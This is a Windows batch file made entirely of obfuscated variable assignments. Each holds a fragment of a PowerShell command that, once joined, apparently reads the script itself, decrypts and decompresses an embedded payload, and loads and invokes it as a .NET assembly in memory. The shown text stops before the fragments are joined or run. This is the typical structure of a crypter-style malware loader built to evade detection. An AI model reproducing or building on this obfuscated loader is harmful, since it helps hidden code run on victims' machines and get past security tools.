@echo off
set "ZmRhCmXMEP==');"
set "yrADivdMMF=Lf);"
set "uDESaILyRr=.Cry"
set "rokuMPjYLQ=.GZi"
set "iYcSOaaHJh=);$g"
set "GSXJokFXRP=brea"
set "xzdbRETUKQ=y]::"
set "ggAotJYaYb=aDNK"
set "VTnyycFZtn=3); "
set "YgHJbFBSFN=$hOu"
set "zpLNosjppb=ct S"
set "dfmlVGaGjO=e = "
set "cZaqdDDodw=ptog"
set "TpfIjisZXK=;$di"
set "sffknZwfsL=null"
set "wLlEqUqHpz=('%~f0'"
set "RNJjGhTgZb='[-1"
set "kYQWfzfqhV=.Key"
set "xIlxuGVraG=embl"
set "KEXVmVSUzz=oArr"
set "XRnZwPvvyo=);$L"
set "TdRkzSZOuD=yste"
set "HjqIVJMWCg=pose"
set "gPzGJrgSpn=C.Su"
set "PtAcaREfLc=rtS4"
set "atVqEDPwlr= = ["
set "zLzfwYoBrV='[-1"
set "qxCtQCQlQf=HO3I"
set "CZvmbMhUos=ddin"
set "BEVeBsGUNY=em.I"
set "tPMlUiKeyP=Comp"
set "rwNBGWrttB=Disp"
set "WZeVAVnmvb=H.Pa"
set "xPxakocPwn=Lf.T"
set "JBEdKyLHMk=esaB"
set "Zvdzrccptj=]::("
set "FfznPpuIqX=:('g"
set "jcRCsbaQnd=; };"
set "BxVedCbIAt=();$"
set "KAyDbefAck=($jr"
set "JVXSpCmeCV=CpU "
set "tdvnefqcBm=daeR"
set "OSbrWgCxEE=PBdg"
set "brDgSGQMPz= New"
set "LtnOCHSnPE=('%*'"
set "RDulYSAxRd=ert]"
set "JXgBFghCxM=Lf ="
set "vmNPEuAvdE=oint"
set "KsgAmHYhYG=RzAL"
set "aaEAmtzCgh=and "
set "pNhCmbqBxK=morF"
set "XbDXecvOIL=HwhH"
set "NcWDqxmVpW=.Cre"
set "uPvDiWUJMN=ptor"
set "saBQwZrMwl=7kGw"
set "nVtWyhBbts=y.Ci"
set "ACMgOgXtAj=('da"
set "fInoNQLDci='oPV"
set "WJKlCgXPAU=();$"
set "QvbHnrNFBP=tsWi"
set "VnpMgBeuEF=bstr"
set "xwwWDGhwVu=umCp"
set "RWsGkbLadn=iPAZ"
set "FpkcKhGdCi=fjC "
set "heEmGQqIIJ=rity"
set "AeBaZRjHMf=Invo"
set "NDeXKCOVFg=raph"
set "OisXSkVcrr=.Sec"
set "LvoHFRxZEF=$rKD"
set "TJSDcIzHax=:: '"
set "zDAyiienic=pher"
set "SiPabmJEIJ=ne);"
set "mmUFNzuTDm=.Mem"
set "PfshiyMgQX=('ev"
set "wPScQPYjwI=, $R"
set "kSUICXxemu=e = "
set "rQeUiNpsyZ=.-16"
set "YMuEFibuxA=HwhH"
set "AaVYWaYVvh=Disp"
set "NgitUsXEEv=S46e"
set "dxyNtMepEI=-1.."
set "kiohzpHWuW=O.Me"
set "WSGROmhNwX=ck($"
set "yCHbfrnDHL=y.Cr"
set "wBHQNMynhp=tS46"
set "fOqxzaWGNm= = $"
set "VmOQIDwpBv=$RzA"
set "pTzfikYvgs=tem."
set "nrJlaoEjXS=g = "
set "xMamQKHqmy=le  "
set "SfFdFNKnWk= = $"
set "pHUfamArSA=hy.A"
set "qdpCldFylY=rity"
set "IOCarmFQwL=dV1k"
set "naNphDMQUH=.Mod"
set "CdUSzJfjbg=.Com"
set "UUTfKolpQT=;$SY"
set "ANtiWqDJoY=R5jf"
set "ZQNGKXLpOx=FcNh"
set "SvUuWieBWH=ispo"
set "ncFlmDlCXy=Mode"
set "mskFcRQwmu=vert"
set "MMUdksiueG=nage"
set "zEefcUOuPP=yTo("
set "ccVtwrVGbg=ion."
set "gLYmaGclKj=em.C"
set "ypqlZkpexY=Bmor"
set "ueoaCUOniw=[]] "
set "sHcoeUeOKI=[Env"
set "ZKnSvJYDwW= [st"
set "BAHMyGXvFh=-joi"
set "BtBTpBaSpw=.IO."
set "gcBlNtemaj=kLM."
set "xegGVYtgyz=comm"
set "CtaDsJteEM=6] -"
set "XBjStaTvjg=rofi"
set "CtjkdPOfIs=, (,"
set "nknkIePIFH=Le ="
set "TIBfoWKGFx=y.Pa"
set "xamofqgrdW=yste"
set "DKpwDyWgtw=[-1."
